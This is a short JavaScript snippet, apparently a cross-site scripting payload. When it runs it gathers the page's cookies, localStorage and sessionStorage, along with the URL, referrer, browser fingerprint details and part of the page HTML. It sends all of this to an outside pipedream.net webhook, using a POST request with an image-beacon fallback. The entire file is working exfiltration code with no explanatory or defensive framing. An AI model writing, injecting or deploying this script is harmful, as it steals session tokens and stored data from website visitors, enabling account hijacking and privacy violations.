(function () {
  const data = {
    cookie: document.cookie,
    location: location.href,
    referrer: document.referrer,
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: {
      width: screen.width,
      height: screen.height
    },
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    html: document.documentElement?.outerHTML?.slice(0, 1000),
    ts: new Date().toISOString(),
    id: Math.random().toString(36).substring(2)
  };

  // Kirim via fetch (utama)
  fetch("https://236fb3a628ae3f3aef9dc3bd171c41c6.m.pipedream.net", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  }).catch(() => {
    // Fallback jika fetch gagal
    new Image().src = `https://236fb3a628ae3f3aef9dc3bd171c41c6.m.pipedream.net/?id=${data.id}&url=${encodeURIComponent(location.href)}&ref=${encodeURIComponent(document.referrer)}`;
  });
})();
